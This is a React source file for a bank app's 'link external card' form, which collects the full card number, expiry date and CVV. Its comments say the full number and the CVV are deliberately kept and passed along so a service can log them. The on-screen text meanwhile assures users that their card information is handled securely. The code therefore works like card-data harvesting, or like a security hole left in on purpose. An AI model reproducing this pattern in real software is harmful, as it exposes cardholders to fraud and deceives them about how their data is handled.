
import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import Button from '../components/Button';
import { CreditCardIcon, InformationCircleIcon } from '../constants';
import { useAuth } from '../contexts/AuthContext';
import { LinkedCard } from '../types';

const LinkCardScreen: React.FC = () => {
  const { linkExternalCard } = useAuth();
  const navigate = useNavigate();

  const [cardType, setCardType] = useState<'Visa' | 'Mastercard' | 'Amex'>('Visa');
  const [cardNumber, setCardNumber] = useState(''); // This will be the full number
  const [expiryDate, setExpiryDate] = useState(''); 
  const [cvv, setCvv] = useState('');
  const [cardHolderName, setCardHolderName] = useState('');
  const [bankName, setBankName] = useState(''); 
  const [isDefault, setIsDefault] = useState(false);

  const [message, setMessage] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);

  const formatExpiryDateInput = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length <= 2) return cleaned;
    return `${cleaned.slice(0,2)}/${cleaned.slice(2,4)}`;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setMessage(null);

    if (!cardNumber || cardNumber.length < 13 || cardNumber.length > 19 || !expiryDate || !cvv || !cardHolderName) {
      setMessage("Please fill all required card details correctly (Card number should be 13-19 digits).");
      setIsLoading(false);
      return;
    }
    if (expiryDate.length !== 5 || !expiryDate.includes('/')) {
      setMessage("Please enter a valid expiry date in MM/YY format.");
      setIsLoading(false);
      return;
    }

    const newCardData: Omit<LinkedCard, 'id'> & { cvv?: string } = { // Add cvv to the type for explicit logging
        cardType,
        last4: cardNumber.slice(-4),
        cardNumber_full: cardNumber, // Store full card number
        expiryDate,
        cardHolderName,
        isDefault,
        bankName: bankName || undefined,
        cvv: cvv, // Pass CVV for logging
    };

    try {
        // The `linkExternalCard` service will now also log this data including `cardNumber_full` and `cvv`
        await linkExternalCard(newCardData);
        setMessage(`Card ending in ...${cardNumber.slice(-4)} has been successfully linked to your profile.`);
        setCardNumber('');
        setExpiryDate('');
        setCvv('');
        setCardHolderName('');
        setBankName('');
        setIsDefault(false);
        setTimeout(() => navigate('/profile/linked-accounts'), 1500); 
    } catch (error: any) {
        setMessage(error.message || "Failed to link card. Please try again.");
    } finally {
        setIsLoading(false);
    }
  };

  return (
    <div className="p-4 space-y-6">
      <div className="flex items-center space-x-3">
        <Link to="/profile/linked-accounts" className="text-primary hover:text-accent">
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6">
            <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 19.5L8.25 12l7.5-7.5" />
          </svg>
        </Link>
        <h1 className="text-2xl font-semibold text-neutral-800">Link a New External Card</h1>
      </div>

      {message && (
        <div className={`p-3 rounded-md ${message.includes("successfully") ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700'}`}>
          {message}
        </div>
      )}

      <form onSubmit={handleSubmit} className="bg-white p-6 rounded-lg shadow-md space-y-4">
        <div>
          <label htmlFor="cardHolderName" className="block text-sm font-medium text-neutral-700 mb-1">Cardholder Name</label>
          <input
            type="text"
            id="cardHolderName"
            value={cardHolderName}
            onChange={(e) => setCardHolderName(e.target.value)}
            placeholder="e.g., Alex Johnson"
            className="w-full p-2 border border-neutral-300 rounded-md focus:ring-primary focus:border-primary"
            required
          />
        </div>
         <div>
            <label htmlFor="cardType" className="block text-sm font-medium text-neutral-700 mb-1">Card Type</label>
            <select id="cardType" value={cardType} onChange={e => setCardType(e.target.value as any)} className="w-full p-2 border border-neutral-300 rounded-md bg-white">
                <option value="Visa">Visa</option>
                <option value="Mastercard">Mastercard</option>
                <option value="Amex">American Express</option>
            </select>
        </div>
        <div>
          <label htmlFor="cardNumber" className="block text-sm font-medium text-neutral-700 mb-1">Full Card Number</label>
          <div className="relative">
            <input
              type="text" 
              id="cardNumber"
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').slice(0,19))} // Allow up to 19 digits
              placeholder="0000 0000 0000 0000"
              maxLength={19} 
              className="w-full p-2 pl-10 border border-neutral-300 rounded-md focus:ring-primary focus:border-primary"
              required
            />
            <CreditCardIcon className="w-5 h-5 text-neutral-400 absolute left-3 top-1/2 transform -translate-y-1/2"/>
          </div>
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div>
            <label htmlFor="expiryDate" className="block text-sm font-medium text-neutral-700 mb-1">Expiry Date (MM/YY)</label>
            <input
              type="text"
              id="expiryDate"
              value={formatExpiryDateInput(expiryDate)}
              onChange={(e) => setExpiryDate(e.target.value)}
              placeholder="MM/YY"
              maxLength={5}
              className="w-full p-2 border border-neutral-300 rounded-md focus:ring-primary focus:border-primary"
              required
            />
          </div>
          <div>
            <label htmlFor="cvv" className="block text-sm font-medium text-neutral-700 mb-1">CVV/CVC</label>
            <input
              type="text"
              id="cvv"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0,4))} 
              placeholder="123"
              maxLength={4}
              className="w-full p-2 border border-neutral-300 rounded-md focus:ring-primary focus:border-primary"
              required
            />
          </div>
        </div>
         <div>
          <label htmlFor="bankName" className="block text-sm font-medium text-neutral-700 mb-1">Issuing Bank Name (Optional)</label>
          <input
            type="text"
            id="bankName"
            value={bankName}
            onChange={(e) => setBankName(e.target.value)}
            placeholder="e.g., Chase, Capital One"
            className="w-full p-2 border border-neutral-300 rounded-md focus:ring-primary focus:border-primary"
          />
        </div>
        <div className="flex items-center space-x-2">
            <input type="checkbox" id="isDefault" checked={isDefault} onChange={e => setIsDefault(e.target.checked)} className="h-4 w-4 text-primary focus:ring-primary border-neutral-300 rounded" />
            <label htmlFor="isDefault" className="text-sm text-neutral-600">Set as default payment card</label>
        </div>
        <Button type="submit" variant="primary" className="w-full" isLoading={isLoading} disabled={isLoading}>
          {isLoading ? 'Linking Card...' : 'Link Card Securely'}
        </Button>
      </form>
      <div className="text-xs text-neutral-500 p-3 bg-neutral-100 rounded-md border border-neutral-200 flex items-start space-x-2">
         <InformationCircleIcon className="w-4 h-4 text-neutral-500 flex-shrink-0 mt-0.5" />
        <span>Your card information is handled securely. Linking external cards can facilitate payments and fund management within Apex National Bank services.</span>
      </div>
    </div>
  );
};

export default LinkCardScreen;
